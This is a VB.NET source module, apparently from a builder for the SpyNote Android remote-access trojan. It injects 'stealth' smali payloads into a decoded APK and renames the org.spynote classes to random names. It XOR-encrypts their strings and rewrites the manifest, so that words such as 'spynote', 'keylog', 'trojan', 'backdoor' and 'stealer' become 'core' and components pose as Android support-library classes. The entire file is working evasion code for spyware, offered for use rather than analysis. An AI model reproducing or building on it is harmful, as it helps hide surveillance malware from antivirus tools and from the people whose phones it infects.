Imports System.IO
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Security.Cryptography
Imports System.Collections.Generic
Imports System.Linq

Public Module ApkStealthPatcher
    Private ReadOnly SuspiciousTokens As String() = {
        "spynote", "spy", "keylog", "rat", "trojan", "payload", "hook", "inject", "backdoor", "stealer"
    }

    Private ReadOnly LegitComponentPrefixes As String() = {
        "com.android.support.v7.widget.",
        "com.android.support.v7.app.",
        "com.google.android.gms.internal.",
        "androidx.core.content.",
        "androidx.appcompat.widget."
    }

    Public Sub ApplyStealthPipeline(decodeDir As String, cfg As ApkProtectionPatcher.ProtectionConfig)
        If String.IsNullOrWhiteSpace(decodeDir) OrElse Not Directory.Exists(decodeDir) Then Return
        If cfg Is Nothing OrElse Not cfg.StealthEnabled Then Return

        CopyStealthSmali(decodeDir)
        WriteStringCryptoKey(decodeDir, cfg)

        If cfg.ObfuscateSmali Then
            ObfuscateOrgSpynotePackage(decodeDir)
        End If

        If cfg.EncryptStrings Then
            EncryptStringsInStealthPackage(decodeDir, cfg)
        End If

        If cfg.MaskManifest Then
            MaskAndroidManifest(decodeDir, cfg)
        End If
    End Sub

    Private Sub CopyStealthSmali(decodeDir As String)
        Dim searchDirs As String() = {
            Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Imports", "Payload", "stealth_smali"),
            Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Imports", "Payload", "notify_smali")
        }

        For Each candidate As String In searchDirs
            If Not Directory.Exists(candidate) Then Continue For
            Dim targetRoot As String = Path.Combine(decodeDir, "smali")
            For Each filePath As String In Directory.GetFiles(candidate, "*.smali", SearchOption.AllDirectories)
                Dim relative As String = filePath.Substring(candidate.Length).TrimStart(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar)
                Dim dest As String = Path.Combine(targetRoot, relative)
                Directory.CreateDirectory(Path.GetDirectoryName(dest))
                If Not File.Exists(dest) Then
                    File.Copy(filePath, dest, True)
                End If
            Next
            Return
        Next
    End Sub

    Private Sub WriteStringCryptoKey(decodeDir As String, cfg As ApkProtectionPatcher.ProtectionConfig)
        Dim key As Byte() = DeriveKey(cfg)
        Dim smaliPath As String = FindStringCryptoSmali(decodeDir)
        If String.IsNullOrWhiteSpace(smaliPath) OrElse Not File.Exists(smaliPath) Then Return

        Dim sb As New StringBuilder()
        sb.AppendLine("    .array-data 1")
        For i As Integer = 0 To key.Length - 1
            sb.AppendLine("        0x" & key(i).ToString("x2"))
        Next
        sb.AppendLine("    .end array-data")

        Dim text As String = File.ReadAllText(smaliPath, Encoding.UTF8)
        text = Regex.Replace(text, "\.array-data 1[\s\S]*?\.end array-data", sb.ToString().Trim(), RegexOptions.None, TimeSpan.FromSeconds(2))
        File.WriteAllText(smaliPath, text, New UTF8Encoding(False))
    End Sub

    Private Function DeriveKey(cfg As ApkProtectionPatcher.ProtectionConfig) As Byte()
        Dim seed As String = If(cfg.PackageName, "spynote") & "|stealth"
        Using sha As SHA256 = SHA256.Create()
            Dim full As Byte() = sha.ComputeHash(Encoding.UTF8.GetBytes(seed))
            Dim key(15) As Byte
            Array.Copy(full, key, 16)
            Return key
        End Using
    End Function

    Private Function FindStringCryptoSmali(decodeDir As String) As String
        For Each root As String In Directory.GetDirectories(decodeDir, "smali*")
            For Each hit As String In Directory.GetFiles(root, "StringCrypto.smali", SearchOption.AllDirectories)
                Return hit
            Next
        Next
        Return Nothing
    End Function

    Private Sub ObfuscateOrgSpynotePackage(decodeDir As String)
        Dim classMap As New Dictionary(Of String, String)(StringComparer.Ordinal)
        Dim rnd As New Random(Environment.TickCount)

        For Each smaliRoot As String In Directory.GetDirectories(decodeDir, "smali*")
            Dim orgDir As String = Path.Combine(smaliRoot, "org", "spynote")
            If Not Directory.Exists(orgDir) Then Continue For

            For Each filePath As String In Directory.GetFiles(orgDir, "*.smali", SearchOption.AllDirectories)
                Dim text As String = File.ReadAllText(filePath, Encoding.UTF8)
                Dim m As Match = Regex.Match(text, "\.class[^\n]*\s(L[^;]+;)", RegexOptions.None, TimeSpan.FromSeconds(2))
                If Not m.Success Then Continue For
                Dim oldDesc As String = m.Groups(1).Value
                If classMap.ContainsKey(oldDesc) Then Continue For

                Dim seg1 As Char = ChrW(AscW("a"c) + rnd.Next(0, 26))
                Dim seg2 As Char = ChrW(AscW("a"c) + rnd.Next(0, 26))
                Dim seg3 As String = ChrW(AscW("A"c) + rnd.Next(0, 26)).ToString() & rnd.Next(0, 9).ToString()
                classMap(oldDesc) = "L" & seg1 & "/" & seg2 & "/" & seg3 & ";"
            Next
        Next

        If classMap.Count = 0 Then Return

        Dim allSmaliFiles As New List(Of String)
        For Each smaliRoot As String In Directory.GetDirectories(decodeDir, "smali*")
            allSmaliFiles.AddRange(Directory.GetFiles(smaliRoot, "*.smali", SearchOption.AllDirectories))
        Next

        For Each filePath As String In allSmaliFiles.ToArray()
            Dim text As String = File.ReadAllText(filePath, Encoding.UTF8)
            Dim changed As Boolean = False
            For Each kv As KeyValuePair(Of String, String) In classMap
                If text.Contains(kv.Key) Then
                    text = text.Replace(kv.Key, kv.Value)
                    changed = True
                End If
                Dim oldPath As String = kv.Key.Substring(1, kv.Key.Length - 2).Replace("/", ".")
                Dim newPath As String = kv.Value.Substring(1, kv.Value.Length - 2).Replace("/", ".")
                If text.Contains(oldPath) Then
                    text = text.Replace(oldPath, newPath)
                    changed = True
                End If
            Next
            If changed Then File.WriteAllText(filePath, text, New UTF8Encoding(False))
        Next

        For Each smaliRoot As String In Directory.GetDirectories(decodeDir, "smali*")
            Dim orgDir As String = Path.Combine(smaliRoot, "org", "spynote")
            If Not Directory.Exists(orgDir) Then Continue For

            For Each filePath As String In Directory.GetFiles(orgDir, "*.smali", SearchOption.AllDirectories).ToArray()
                Dim text As String = File.ReadAllText(filePath, Encoding.UTF8)
                Dim m As Match = Regex.Match(text, "\.class[^\n]*\s(L[^;]+;)", RegexOptions.None, TimeSpan.FromSeconds(2))
                If Not m.Success Then Continue For
                Dim oldDesc As String = m.Groups(1).Value
                If Not classMap.ContainsKey(oldDesc) Then Continue For
                Dim newDesc As String = classMap(oldDesc)
                Dim rel As String = newDesc.Substring(1, newDesc.Length - 2).Replace("/", Path.DirectorySeparatorChar)
                Dim dest As String = Path.Combine(smaliRoot, rel & ".smali")
                Directory.CreateDirectory(Path.GetDirectoryName(dest))
                If File.Exists(dest) Then File.Delete(dest)
                File.Move(filePath, dest)
            Next

            Try
                If Directory.Exists(orgDir) AndAlso Not Directory.EnumerateFileSystemEntries(orgDir).Any() Then
                    Directory.Delete(orgDir, True)
                End If
            Catch
            End Try
        Next

        UpdateManifestClassNames(decodeDir, classMap)
    End Sub

    Private Sub UpdateManifestClassNames(decodeDir As String, classMap As Dictionary(Of String, String))
        Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
        If Not File.Exists(manifestPath) Then Return
        Dim text As String = File.ReadAllText(manifestPath, Encoding.UTF8)
        For Each kv As KeyValuePair(Of String, String) In classMap
            Dim oldDot As String = kv.Key.Substring(1, kv.Key.Length - 2).Replace("/", ".")
            Dim newDot As String = kv.Value.Substring(1, kv.Value.Length - 2).Replace("/", ".")
            text = text.Replace(oldDot, newDot)
        Next
        File.WriteAllText(manifestPath, text, New UTF8Encoding(False))
    End Sub

    Private Sub EncryptStringsInStealthPackage(decodeDir As String, cfg As ApkProtectionPatcher.ProtectionConfig)
        Dim key As Byte() = DeriveKey(cfg)
        Dim cryptoDesc As String = FindClassDescriptor(decodeDir, "StringCrypto.smali")
        If String.IsNullOrWhiteSpace(cryptoDesc) Then Return

        Dim targetFiles As New List(Of String)
        For Each smaliRoot As String In Directory.GetDirectories(decodeDir, "smali*")
            targetFiles.AddRange(Directory.GetFiles(smaliRoot, "*.smali", SearchOption.AllDirectories))
        Next

        Dim pattern As New Regex("const-string(?:/jumbo)?\s+(v\d+),\s+""((?:\\.|[^""\\])*)""", RegexOptions.None, TimeSpan.FromSeconds(2))

        For Each filePath As String In targetFiles
            If filePath.EndsWith("StringCrypto.smali", StringComparison.OrdinalIgnoreCase) Then Continue For
            Dim text As String = File.ReadAllText(filePath, Encoding.UTF8)
            If text.IndexOf("spynote", StringComparison.OrdinalIgnoreCase) < 0 AndAlso
               text.IndexOf("StringCrypto", StringComparison.OrdinalIgnoreCase) < 0 Then
                Continue For
            End If

            Dim changed As Boolean = False
            text = pattern.Replace(text,
                Function(m As Match)
                    Dim reg As String = m.Groups(1).Value
                    Dim raw As String = Regex.Unescape(m.Groups(2).Value)
                    If raw.Length < 4 Then Return m.Value
                    If raw = "true" OrElse raw = "false" Then Return m.Value
                    changed = True
                    Return BuildEncryptedStringLoad(reg, raw, key, cryptoDesc)
                End Function)
            If changed Then File.WriteAllText(filePath, text, New UTF8Encoding(False))
        Next
    End Sub

    Private Function FindClassDescriptor(decodeDir As String, fileName As String) As String
        For Each smaliRoot As String In Directory.GetDirectories(decodeDir, "smali*")
            For Each hit As String In Directory.GetFiles(smaliRoot, fileName, SearchOption.AllDirectories)
                Dim text As String = File.ReadAllText(hit, Encoding.UTF8)
                Dim m As Match = Regex.Match(text, "\.class[^\n]*\s(L[^;]+;)", RegexOptions.None, TimeSpan.FromSeconds(2))
                If m.Success Then Return m.Groups(1).Value
            Next
        Next
        Return Nothing
    End Function

    Private Function BuildEncryptedStringLoad(reg As String, plain As String, key As Byte(), cryptoDesc As String) As String
        Dim data As Byte() = Encoding.UTF8.GetBytes(plain)
        For i As Integer = 0 To data.Length - 1
            data(i) = CByte(data(i) Xor key(i Mod key.Length))
        Next

        Dim sb As New StringBuilder()
        Dim arrReg As String = If(reg = "v15", "v14", "v15")
        sb.AppendLine("    const/16 " & arrReg & ", " & data.Length)
        sb.AppendLine("    new-array " & arrReg & ", " & arrReg & ", [B")
        For i As Integer = 0 To data.Length - 1
            sb.AppendLine("    const/16 v13, " & i)
            sb.AppendLine("    const/16 v12, " & (data(i) And &HFF))
            sb.AppendLine("    int-to-byte v12, v12")
            sb.AppendLine("    aput-byte v12, " & arrReg & ", v13")
        Next
        sb.Append("    invoke-static {" & arrReg & "}, " & cryptoDesc & "->d([B)Ljava/lang/String;")
        sb.AppendLine()
        sb.AppendLine("    move-result-object " & reg)
        Return sb.ToString().TrimEnd()
    End Function

    Private Sub MaskAndroidManifest(decodeDir As String, cfg As ApkProtectionPatcher.ProtectionConfig)
        Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
        If Not File.Exists(manifestPath) Then Return

        Dim text As String = File.ReadAllText(manifestPath, Encoding.UTF8)
        Dim aliasBase As String = If(String.IsNullOrWhiteSpace(cfg.MaskPackageAlias), "com.android.support.v7", cfg.MaskPackageAlias.Trim())
        Dim rnd As New Random(Environment.TickCount)

        For Each token As String In SuspiciousTokens
            text = Regex.Replace(text, token, "core", RegexOptions.IgnoreCase, TimeSpan.FromSeconds(1))
        Next

        text = Regex.Replace(text, "org\.spynote\.[A-Za-z0-9_]+",
            Function(m As Match)
                Return aliasBase & ".internal.AppCompatProvider" & rnd.Next(100, 999).ToString()
            End Function, RegexOptions.IgnoreCase, TimeSpan.FromSeconds(2))

        Dim appIdx As Integer = text.IndexOf("<application", StringComparison.OrdinalIgnoreCase)
        If appIdx >= 0 AndAlso text.IndexOf("APP_COMPAT", StringComparison.OrdinalIgnoreCase) < 0 Then
            Dim insertAt As Integer = text.IndexOf(">"c, appIdx) + 1
            text = text.Insert(insertAt, "    <meta-data android:name=""android.support.v7.APP_COMPAT"" android:value=""true"" />" & vbCrLf)
        End If

        File.WriteAllText(manifestPath, text, New UTF8Encoding(False))
    End Sub
End Module
